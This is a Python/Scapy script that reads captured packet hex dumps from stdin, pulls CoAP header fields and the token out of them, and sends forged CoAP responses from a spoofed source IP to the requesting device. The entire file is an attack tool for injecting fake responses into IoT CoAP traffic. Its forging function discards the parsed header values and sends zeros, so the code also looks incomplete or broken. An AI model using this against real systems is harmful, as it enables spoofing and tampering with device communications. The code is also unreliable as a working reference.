# Python imports
import re
import sys
from bitstring import BitArray

# Scapy imports
import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import IP, TCP, conf, Raw
from scapy.contrib.coap import *


def main():
    src = str(sys.argv[1])
    dst = str(sys.argv[2])

    port = 0
    payload = '0x'
    is_new_header = 0
    while True:
        line = sys.stdin.readline()
        if line[1:5].startswith("0x0"):
            payload += line[10:49].replace(' ', '')
            is_new_header += 1
        else:
            is_new_header = 0
            payload = '0x'
            port = int(line[29:34])

        if is_new_header == 4:
            packetBits = BitArray(payload)
            version = int(packetBits[224:226].bin, 2)
            type = int(packetBits[226:228].bin, 2)
            code = int(packetBits[232:240].bin, 2)
            messageID = int(packetBits[240:256].bin, 2)
            token = packetBits[256:320].bytes
            forgeResponse(version, type, code, messageID, token, src, dst, port)


def forgeResponse(version, type, code, messageID, token, src, dst, port):
    sock = conf.L3socket()

    PAYLOAD = CoAP(ver=0, type=0, code=0, msg_id=0, token=0, options=[("Content-Format", b"\x00")], paymark=b"\xff")
    PAYLOAD.add_payload(Raw(""))
    packet = IP(src=src, dst=dst) / UDP(sport=5683, dport=port) / PAYLOAD
    sock.send(packet)


if __name__ == "__main__":
    sys.exit(main())
